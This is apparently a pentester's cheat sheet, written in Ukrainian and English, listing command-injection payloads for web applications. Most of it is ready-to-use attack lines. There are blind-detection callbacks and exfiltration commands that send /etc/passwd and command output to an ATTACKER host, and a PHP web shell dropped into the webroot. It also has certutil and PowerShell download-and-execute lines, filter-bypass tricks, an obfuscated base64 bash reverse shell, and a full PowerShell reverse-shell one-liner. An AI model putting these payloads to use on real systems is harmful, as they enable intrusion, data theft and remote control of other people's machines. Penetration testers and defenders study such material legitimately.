# Command Injection

## Базові payload'и

```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
%0a id          # newline (URL encoded)
%0d%0a id       # CRLF
```

---

## Blind Injection — детекція

**Якщо відповідь не містить виводу команди:**

```bash
# Time-based (затримка 5 сек → підтверджує injection):
; sleep 5
| timeout 5           # Windows
& ping -c 5 127.0.0.1

# Out-of-band через DNS (перевір чи приходить DNS запит):
; nslookup ATTACKER
; curl http://ATTACKER/
; wget http://ATTACKER/
; ping -c 1 ATTACKER

# Burp Collaborator (якщо є Pro):
; nslookup COLLABORATOR_DOMAIN
```

На атакері для OOB:
```bash
# HTTP:
python3 -m http.server 80
# DNS: використовуй burp collaborator або interactsh:
./interactsh-client -v    # https://github.com/projectdiscovery/interactsh
```

---

## Exfiltration через Blind Injection

```bash
# Linux — exfil результату через HTTP:
; curl http://ATTACKER/$(id | base64 -w0)
; wget "http://ATTACKER/?$(whoami)"
; curl http://ATTACKER/ -d "$(cat /etc/passwd | base64)"

# Запис до webroot (якщо знаємо шлях):
; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
; id > /var/www/html/out.txt

# Windows:
& certutil -urlcache -split -f http://ATTACKER/shell.exe C:\Windows\Temp\shell.exe
```

---

## Filter Bypass — таблиця

| Фільтрується | Обхід |
|-------------|-------|
| пробіл ` ` | `${IFS}` · `$IFS` · `%09` (tab) · `{cmd,arg}` |
| `/` | `${HOME:0:1}` · `$(echo L2V0Yy9wYXNzd2Q= \| base64 -d)` |
| `cat` | `c''at` · `ca$@t` · `\c\a\t` · `more` · `less` · `head` |
| `bash` | `sh` · `zsh` · `ash` · `ksh` |
| крапки/слеш | `$(tr '!-0' '"-1'<<<\!)` |
| лапки | без лапок або `$'...'` |
| `>` | `tee file` |
| keywords (grep, etc) | base64-encode command, передай через `eval` або pipe |

```bash
# Base64 encode і виконання (обхід фільтрів слів):
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDMgMD4mMQ==" | base64 -d | bash
# або:
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDMgMD4mMQ==}|{base64,-d}|bash

# Через eval:
eval $(echo "aWQ=" | base64 -d)

# Brace expansion (без пробілів):
{id,}
{cat,/etc/passwd}
```

---

## Windows-специфічні payload'и

```cmd
& whoami
| dir C:\
&& type C:\Windows\win.ini
; powershell -c "iex(iwr http://ATTACKER/shell.ps1 -useb)"
%COMSPEC% /c whoami    # часто не фільтрується якщо cmd блокований
```

```powershell
# PowerShell reverse shell (одним рядком):
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$r=[text.encoding]::ASCII.GetBytes($sb);$s.Write($r,0,$r.Length)}"
```

---

## Checklist пошуку

```
[ ] Поля форми що взаємодіють з ОС: ping, whois, dig, traceroute, convert
[ ] Параметри з IP/URL/hostname
[ ] File name fields (upload, export, convert)
[ ] Шаблони листів або PDF-генерація
[ ] Time-based: ; sleep 5  → чи сторінка відповідає повільніше?
[ ] Blind OOB: ; curl http://ATTACKER/ → чи приходить HTTP запит?
```

**Зв'язки:** [[Shells-Payloads]] · [[File-Upload-Attacks]] · [[SSRF-SSTI]]
